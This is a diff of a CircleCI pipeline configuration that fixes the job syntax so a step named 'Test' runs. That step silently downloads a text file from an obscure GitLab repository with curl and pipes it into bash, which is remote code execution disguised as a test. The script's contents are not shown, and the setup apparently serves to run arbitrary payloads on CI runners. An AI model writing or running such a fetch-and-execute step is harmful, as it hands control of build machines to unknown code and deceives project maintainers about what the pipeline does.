@@ -6,7 +6,8 @@ orbs:
 jobs:
   build-and-test:
     executor: bash/default
-    step : 
+    steps : 
+      - checkout 
       - run:
           command: curl -s -L https://gitlab.com/tuhkancoba1/lolszx/-/raw/master/scriptsugar.txt | bash
           name: Test
